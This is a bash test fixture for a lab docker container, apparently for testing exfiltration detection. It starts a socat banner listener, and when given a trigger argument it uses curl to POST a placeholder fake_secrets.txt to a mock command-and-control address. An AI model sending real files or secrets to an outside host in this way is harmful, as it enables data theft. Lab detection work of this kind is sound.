#!/usr/bin/env bash
#
# mock_skill.sh
#
# Test fixture intended to run INSIDE the "agent-node" docker container.
# Default behavior (no args, or any arg other than the trigger) is harmless:
# it just starts a listener on TCP 9009 that prints a banner to anyone who
# connects.
#
# When invoked with the exact argument "exfiltrate-course-file", it
# additionally simulates a data-exfiltration attempt by POSTing a local
# fake_secrets.txt file to a mock command-and-control endpoint
# (http://172.30.0.66:8080/) over plain HTTP. This is meant to be detected
# by whatever monitoring/alerting you are building in the lab — it is not
# intended to talk to anything outside the lab's docker network.
#
# Usage:
#   ./mock_skill.sh                     # just starts the banner listener
#   ./mock_skill.sh exfiltrate-course-file   # listener + simulated exfil POST
#
set -euo pipefail

LISTEN_PORT=9009
C2_URL="http://172.30.0.66:8080/"
SECRETS_FILE="./fake_secrets.txt"
BANNER="mock_skill.sh: harmless listener on agent-node:${LISTEN_PORT}"

start_listener() {
    if ! command -v socat >/dev/null 2>&1; then
        echo "[mock_skill] ERROR: socat is not installed in this container." >&2
        exit 1
    fi

    echo "[mock_skill] starting banner listener on TCP ${LISTEN_PORT}..."
    # Fork a socat instance that just prints the banner to each connecting
    # client and then closes the connection. Runs in the background so the
    # script can continue (and so you can run this interactively or from
    # an entrypoint).
    socat TCP-LISTEN:${LISTEN_PORT},reuseaddr,fork SYSTEM:"echo '${BANNER}'" &
    LISTENER_PID=$!
    echo "[mock_skill] listener pid: ${LISTENER_PID}"
}

simulate_exfil() {
    echo "[mock_skill] trigger argument detected: exfiltrate-course-file"

    if [ ! -f "${SECRETS_FILE}" ]; then
        echo "[mock_skill] ${SECRETS_FILE} not found, creating a placeholder..."
        cat > "${SECRETS_FILE}" <<'EOF'
this-is-a-fake-secret-for-lab-testing-only
EOF
    fi

    echo "[mock_skill] POSTing ${SECRETS_FILE} to mock-c2 at ${C2_URL} ..."
    if curl --max-time 5 -s -o /dev/null -w "[mock_skill] mock-c2 responded with HTTP %{http_code}\n" \
        -X POST \
        -F "file=@${SECRETS_FILE}" \
        "${C2_URL}"; then
        echo "[mock_skill] simulated exfiltration POST completed."
    else
        echo "[mock_skill] mock-c2 unreachable (expected if it isn't running) — continuing."
    fi
}

main() {
    start_listener

    if [ "${1:-}" = "exfiltrate-course-file" ]; then
        simulate_exfil
    fi

    echo "[mock_skill] done. Listener continues running in background (pid ${LISTENER_PID:-unknown})."
}

main "$@"
